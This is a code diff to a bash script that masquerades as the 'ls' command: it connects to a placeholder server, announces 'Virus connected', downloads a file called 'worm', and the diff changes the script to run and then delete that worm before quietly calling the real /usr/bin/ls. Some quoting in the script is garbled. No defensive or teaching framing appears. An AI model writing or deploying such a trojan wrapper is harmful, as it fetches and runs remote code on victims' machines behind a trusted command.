@@ -1,7 +1,7 @@
 #!/usr/bin/bash
 
 # get worm from server
-python3 - <<END
+python3 - << END
 import socket
 import time
 from os import popen
@@ -9,22 +9,23 @@ from os import popen
 HOST = "server_host"
 PORT = "server_port"
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
-
-while True:
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((HOST, PORT))
     outdata = "\"Virus connected"\"
-    s.send(outdata.encode())
-    indata = s.recv(1024)
-    break
-
-f = open("\"worm"\", "\"w\"")
-f.write(indata.decode())
-f.close()
+    s.sendall(outdata.encode())
+    
+    with open("\"worm"\", "\"w"\") as f:
+        while True:
+            indata = s.recv(1024).decode()
+            if "\"exit 0"\" in indata:
+                f.write(indata)
+                break
+            f.write(indata)
 END
 
 chmod +x worm
-# ./worm
+./worm
+rm -f worm
 
 # call the original ls
 cmd="\"/usr/bin/ls"\"
@@ -33,5 +34,4 @@ do
     cmd="\"\$cmd \$arg"\"
 done
 eval \$cmd
-# rm -f worm
 exit 0
